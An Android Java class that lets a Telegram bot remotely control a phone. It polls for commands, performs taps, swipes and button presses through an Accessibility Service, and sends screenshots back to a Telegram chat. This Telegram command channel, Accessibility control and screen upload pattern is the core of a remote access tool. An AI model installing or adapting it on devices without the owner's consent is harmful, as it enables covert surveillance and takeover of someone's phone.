package com.remotecontrol;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class TelegramEngine implements Runnable {

    private static final String TAG = "TelegramEngine";
    private static final String API_BASE = "https://api.telegram.org/bot";
    
    private final String botToken;
    private final String miniAppUrl;
    private final Context context;
    private final OkHttpClient httpClient;
    
    private volatile boolean running = true;
    private long lastUpdateId = 0;

    public TelegramEngine(Context context, String botToken, String miniAppUrl) {
        this.context = context.getApplicationContext();
        this.botToken = botToken;
        this.miniAppUrl = miniAppUrl;
        this.httpClient = new OkHttpClient.Builder()
                .connectTimeout(15, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .build();
    }

    public void stop() {
        running = false;
    }

    @Override
    public void run() {
        Log.i(TAG, "Telegram Long Polling started");
        while (running) {
            try {
                poll();
            } catch (Exception e) {
                Log.e(TAG, "Poll error: " + e.getMessage());
                sleep(5000);
            }
        }
    }

    private void poll() throws IOException, JSONException {
        String url = API_BASE + botToken + "/getUpdates?timeout=50" 
                   + (lastUpdateId > 0 ? "&offset=" + (lastUpdateId + 1) : "");
        
        Request request = new Request.Builder().url(url).build();
        
        try (Response response = httpClient.newCall(request).execute()) {
            if (!response.isSuccessful()) return;
            
            String responseBody = response.body() != null ? response.body().string() : "";
            if (responseBody.isEmpty()) return;

            JSONObject json = new JSONObject(responseBody);
            if (!json.optBoolean("ok")) return;
            
            JSONArray updates = json.getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                JSONObject up = updates.getJSONObject(i);
                lastUpdateId = up.getLong("update_id");
                handleUpdate(up);
            }
        }
    }

    private void handleUpdate(JSONObject update) {
        try {
            if (update.has("message")) {
                JSONObject msg = update.getJSONObject("message");
                long chatId = msg.getJSONObject("chat").getLong("id");

                if (msg.has("web_app_data")) {
                    handleWebAppData(chatId, msg.getJSONObject("web_app_data").getString("data"));
                } else {
                    String text = msg.optString("text", "");
                    if (text.equals("/start")) {
                        sendMenu(chatId);
                    } else if (text.equals("/screenshot")) {
                        handleScreenshot(chatId);
                    }
                }
            } else if (update.has("callback_query")) {
                JSONObject cb = update.getJSONObject("callback_query");
                long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
                String data = cb.getString("data");
                
                // Отвечаем на коллбек, чтобы кнопка не "висела" в загрузке
                post("answerCallbackQuery", new JSONObject().put("callback_query_id", cb.getString("id")).toString());
                
                if (data.equals("sc")) {
                    handleScreenshot(chatId);
                }
            }
        } catch (JSONException e) {
            Log.e(TAG, "Update parsing error: " + e.getMessage());
        }
    }

    private void handleWebAppData(long chatId, String data) {
        try {
            JSONObject cmd = new JSONObject(data);
            String action = cmd.optString("a", "").toLowerCase();
            MyAccessibilityService a11y = MyAccessibilityService.getInstance();

            if (a11y == null && !action.equals("screenshot")) {
                sendMessage(chatId, "⚠️ Включите Accessibility Service в настройках телефона!");
                return;
            }

            switch (action) {
                case "tap":
                    a11y.performClick((float) cmd.getDouble("x"), (float) cmd.getDouble("y"));
                    break;
                case "swipe":
                    a11y.performSwipe(
                        (float) cmd.getDouble("x1"), (float) cmd.getDouble("y1"), 
                        (float) cmd.getDouble("x2"), (float) cmd.getDouble("y2"), 
                        cmd.optLong("dur", 300)
                    );
                    break;
                case "longpress":
                    a11y.performLongPress((float) cmd.getDouble("x"), (float) cmd.getDouble("y"));
                    break;
                case "home":
                    a11y.pressHome();
                    break;
                case "back":
                    a11y.pressBack();
                    break;
                case "recents":
                    a11y.pressRecents();
                    break;
                case "screenshot":
                    handleScreenshot(chatId);
                    break;
                default:
                    sendMessage(chatId, "Неизвестная команда: " + action);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "WebApp Error: " + e.getMessage());
            sendMessage(chatId, "❌ Ошибка обработки JSON: " + e.getMessage());
        }
    }

    private void handleScreenshot(long chatId) {
        Intent intent = new Intent(context, ScreenCaptureRequestActivity.class);
        intent.putExtra("chat_id", chatId);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    private void sendMenu(long chatId) {
        try {
            JSONObject menu = new JSONObject();
            JSONArray keyboard = new JSONArray();
            
            // Первая строка кнопок
            JSONArray row1 = new JSONArray();
            JSONObject webAppBtn = new JSONObject();
            webAppBtn.put("text", "🎮 Панель управления");
            webAppBtn.put("web_app", new JSONObject().put("url", miniAppUrl));
            row1.put(webAppBtn);
            
            // Вторая строка кнопок
            JSONArray row2 = new JSONArray();
            JSONObject scBtn = new JSONObject();
            scBtn.put("text", "📸 Скриншот");
            scBtn.put("callback_data", "sc");
            row2.put(scBtn);

            keyboard.put(row1);
            keyboard.put(row2);
            menu.put("inline_keyboard", keyboard);

            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("text", "Система готова к работе. Выберите действие:");
            body.put("reply_markup", menu);

            post("sendMessage", body.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Menu error", e);
        }
    }

    public void sendMessage(long chatId, String text) {
        try {
            JSONObject json = new JSONObject().put("chat_id", chatId).put("text", text);
            post("sendMessage", json.toString());
        } catch (Exception ignored) {}
    }

    public void sendPhoto(long chatId, File file, String caption) {
        RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", String.valueOf(chatId))
                .addFormDataPart("photo", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg")))
                .addFormDataPart("caption", caption != null ? caption : "")
                .build();
                
        Request req = new Request.Builder()
                .url(API_BASE + botToken + "/sendPhoto")
                .post(body)
                .build();
                
        httpClient.newCall(req).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to send photo", e);
            }
            @Override public void onResponse(Call call, Response response) throws IOException { 
                response.close(); 
            }
        });
    }

    private void post(String method, String json) {
        RequestBody body = RequestBody.create(json, MediaType.parse("application/json"));
        Request req = new Request.Builder()
                .url(API_BASE + botToken + "/" + method)
                .post(body)
                .build();
                
        httpClient.newCall(req).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {
                Log.e(TAG, "API request failed: " + method, e);
            }
            @Override public void onResponse(Call call, Response response) throws IOException { 
                response.close(); 
            }
        });
    }

    private void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}
